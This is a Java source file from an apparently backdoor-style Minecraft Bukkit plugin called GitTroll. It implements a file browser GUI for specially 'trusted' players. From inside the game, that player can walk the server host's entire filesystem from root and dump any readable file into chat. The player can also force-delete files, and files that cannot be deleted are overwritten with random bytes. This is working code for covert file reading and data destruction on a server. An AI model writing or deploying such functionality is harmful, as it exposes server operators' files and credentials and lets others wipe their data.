package net.Lenni0451.GitTroll.command.commands.server;

import java.io.File;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Scanner;

import org.apache.commons.io.FileUtils;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.event.EventListener;
import net.Lenni0451.GitTroll.event.events.EventUntrustPlayer;
import net.Lenni0451.GitTroll.event.types.Event;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.Lenni0451.GitTroll.utils.ItemStackUtils;

public class FileBrowser extends CommandBase implements Listener, EventListener {

	Map<CustomPlayer, File> currentFiles = new HashMap<>();
	
	public FileBrowser() {
		super("FileBrowser", "Open a file browser");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			this.openGui(executor);
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

	@Override
	public void onEvent(Event event) {
		if(event instanceof EventUntrustPlayer) {
			this.currentFiles.remove(CustomPlayer.instanceOf(((EventUntrustPlayer) event).getPlayer()));
		}
	}
	
	private void openGui(final CustomPlayer player) {
		if(!player.isTrusted()) {
			this.currentFiles.remove(player);
			return;
		}
		if(!this.currentFiles.containsKey(player)) {
			String path = new File("./").getAbsolutePath();
			path = path.substring(0, path.length() - 2);
			this.currentFiles.put(player, new File(path));
		}
		
		File currentFile = this.currentFiles.get(player);
		Inventory inv = null;
		
		if(currentFile.isFile()) {
			inv = Bukkit.createInventory(null, 9, "§6File §5" + currentFile.getName());
			
			{ //Back Arrow
				ItemStack stack = ItemStackUtils.generateNew(Material.ARROW, "§6Back");
				inv.addItem(stack);
			}
			{ //Spacer
				ItemStack stack = ItemStackUtils.generateNew(Material.STAINED_GLASS_PANE, " ", 1, 15);
				inv.addItem(stack);
			}
			{ //Print
				ItemStack stack = ItemStackUtils.generateNew(Material.BOOK, "§6Print Content");
				inv.addItem(stack);
			}
			{ //Delete
				ItemStack stack = ItemStackUtils.generateNew(Material.BARRIER, "§6Delete File", 1, 15);
				inv.addItem(stack);
			}
		} else {
			boolean hasParent = currentFile.getParentFile() != null;
			int neededSlots = currentFile.listFiles().length + (hasParent ? 3 : 2);
			int rows = Double.valueOf(Math.ceil((double) neededSlots / 9D)).intValue();
			
			inv = Bukkit.createInventory(null, rows * 9, "§6Folder §5" + (currentFile.getName().isEmpty() ? "root" : currentFile.getName()));
			if(hasParent) {
				{ //Back Arrow
					ItemStack stack = ItemStackUtils.generateNew(Material.ARROW, "§6Back");
					inv.addItem(stack);
				}
			}
			{ //Home
				ItemStack stack = ItemStackUtils.generateNew(Material.WOOD_DOOR, "§6Home");
				inv.addItem(stack);
			}
			{ //Spacer
				ItemStack stack = ItemStackUtils.generateNew(Material.STAINED_GLASS_PANE, " ", 1, 15);
				inv.addItem(stack);
			}
			List<String> dirs = new ArrayList<>();
			List<String> files = new ArrayList<>();
			for(File f : currentFile.listFiles()) {
				if(f.isFile()) {
					files.add(f.getAbsolutePath());
				} else {
					dirs.add(f.getAbsolutePath());
				}
			}
			for(String file : dirs) {
				File f = new File(file);
				
				ItemStack stack;
				stack = ItemStackUtils.generateNew(Material.CHEST, "§6" + f.getName());
				
				inv.addItem(stack);
			}
			for(String file : files) {
				File f = new File(file);
				
				ItemStack stack;
				stack = ItemStackUtils.generateNew(Material.PAPER, "§6" + f.getName());
				ItemMeta meta = stack.getItemMeta();
				meta.setDisplayName("§6" + f.getName());
				DecimalFormat format = new DecimalFormat();
				format.setMaximumFractionDigits(2);
				format.setMinimumFractionDigits(0);
				String size = this.humanReadableByteCount(f.length());
				meta.setLore(Arrays.asList("§6Size§7: §5" + size));
				stack.setItemMeta(meta);
				
				inv.addItem(stack);
			}
		}
		
		player.getPlayer().openInventory(inv);
	}
	
	@EventHandler
	public void onClick(InventoryClickEvent event) {
		CustomPlayer player = CustomPlayer.instanceOf((Player) event.getWhoClicked());
		
		if(player.isTrusted() && this.currentFiles.containsKey(player)) {
			if(event.getInventory().getName().startsWith("§6Folder §5")) {
				event.setCancelled(true);
				
				File current = this.currentFiles.get(player);
				ItemStack clickedItem = event.getCurrentItem();
				
				if(clickedItem.getItemMeta().getDisplayName().equals("§6Back") && clickedItem.getType().equals(Material.ARROW)) {
					this.currentFiles.replace(player, current.getParentFile());
					this.openGui(player);
				} else if(clickedItem.getItemMeta().getDisplayName().equals("§6Home") && clickedItem.getType().equals(Material.WOOD_DOOR)) {
					this.currentFiles.remove(player);
					this.openGui(player);
				} else if(clickedItem.getType().equals(Material.PAPER) || clickedItem.getType().equals(Material.CHEST)) {
					String file = clickedItem.getItemMeta().getDisplayName().replaceAll("§.", "");
					File f = new File(current.getAbsolutePath(), file);
					this.currentFiles.put(player, f);
					try {
						this.openGui(player);
					} catch (Throwable e) {
						player.sendGitMessage("§cYou don't have enough permissions to open this folder.");
						this.currentFiles.put(player, current);
					}
				}
			} else if(event.getInventory().getName().startsWith("§6File §5")) {
				event.setCancelled(true);
				
				File current = this.currentFiles.get(player);
				ItemStack clickedItem = event.getCurrentItem();
				
				if(clickedItem.getItemMeta().getDisplayName().equals("§6Back") && clickedItem.getType().equals(Material.ARROW)) {
					this.currentFiles.replace(player, current.getParentFile());
					try {
						this.openGui(player);
					} catch (Throwable e) {
						player.sendGitMessage("§cYou don't have enough permissions to open this folder.");
						this.currentFiles.put(player, current);
					}
				} else if(clickedItem.getItemMeta().getDisplayName().equals("§6Print Content") && clickedItem.getType().equals(Material.BOOK)) {
					try {
						Scanner s = new Scanner(current);
						while(s.hasNextLine()) {
							player.sendMessage(s.nextLine());
						}
						s.close();
					} catch (Exception e) {
						player.sendGitMessage("§cYou don't have enough permissions read the file content.");
					}
					
					player.getPlayer().closeInventory();
				} else if(clickedItem.getItemMeta().getDisplayName().equals("§6Delete File") && clickedItem.getType().equals(Material.BARRIER)) {
					player.sendGitMessage("§aDeleting File...");
					try {
						FileUtils.forceDelete(current);
						player.sendGitMessage("The file has been deleted.");
					} catch (Throwable e) {
						player.sendGitMessage("§cThe file could not be deleted. The file is going to be overwritten.");
						try {
							byte[] bytes = new byte[1024];
							new Random().nextBytes(bytes);
							FileUtils.writeByteArrayToFile(current, bytes);
							player.sendGitMessage("The file has been overwritten.");
						} catch (Throwable e2) {
							player.sendGitMessage("§cThe file could not be overwritten.");
						}
					}
					
					this.currentFiles.replace(player, current.getParentFile());
					try {
						this.openGui(player);
					} catch (Throwable e) {
						player.sendGitMessage("§cYou don't have enough permissions to open this folder.");
						this.currentFiles.put(player, current);
					}
				}
			}
		}
	}
	
	private String humanReadableByteCount(long bytes) {
	    int unit = 1024;
	    if (bytes < unit) return bytes + " B";
	    int exp = (int) (Math.log(bytes) / Math.log(unit));
	    String pre = ("KMGTPE").charAt(exp-1) + ("i");
	    return String.format("%.1f %sB", bytes / Math.pow(unit, exp), pre);
	}
	
}
